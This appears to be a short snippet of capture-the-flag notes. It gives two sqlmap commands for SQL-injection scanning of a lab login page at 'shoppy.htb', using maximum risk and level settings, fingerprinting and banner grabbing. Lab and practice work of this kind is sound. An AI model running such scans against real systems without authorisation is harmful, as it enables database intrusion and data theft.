sqlmap -r REQUEST_FILE
sqlmap -u "http://shoppy.htb/login" --data "username=admin&password=admin" --risk 3 --level 5 -f --banner --ignore-code 401 --dbms='SQL_TYPE'